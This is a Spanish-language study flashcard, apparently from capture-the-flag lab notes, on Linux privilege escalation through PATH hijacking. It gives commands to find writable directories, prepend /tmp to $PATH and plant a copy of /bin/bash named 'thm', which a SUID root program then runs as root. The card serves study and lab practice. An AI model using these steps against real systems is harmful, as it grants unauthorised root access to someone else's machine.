Flashcard – Privilege Escalation via **PATH Hijacking**

**Concepto:**

* `$PATH` define en qué directorios busca Linux los ejecutables.
* Si un script/binario con **SUID root** ejecuta un comando sin ruta absoluta (`ls`, `cp`, `thm`, etc.), el sistema buscará ese binario en los directorios listados en `$PATH`.
* Si un directorio dentro de `$PATH` es **escribible por el usuario**, se puede colocar allí un ejecutable malicioso con el mismo nombre, que correrá con privilegios de root.

---

**Identificación:**

1. Ver valor de `$PATH`:

   ```bash
   echo $PATH
   ```
2. Buscar directorios escribibles:

   ```bash
   find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
   ```
3. Confirmar si alguno de esos directorios está en `$PATH`.

---

**Explotación (ejemplo con `/tmp`):**

1. Si `/tmp` no está en `$PATH`, añadirlo:

   ```bash
   export PATH=/tmp:$PATH
   ```

2. Crear binario malicioso (ejemplo copiando `/bin/bash`):

   ```bash
   cp /bin/bash /tmp/thm
   chmod +x /tmp/thm
   ```

3. Cuando el programa con **SUID root** ejecute `thm`, en realidad se ejecutará `/tmp/thm` con privilegios de root → escalada de privilegios.

---

**Resumen clave:**

* Verifica `$PATH` y permisos de escritura.
* Crea ejecutable falso con el nombre del binario que llama el script SUID.
* PATH hijacking = root si se cumple que el binario vulnerable tiene SUID.
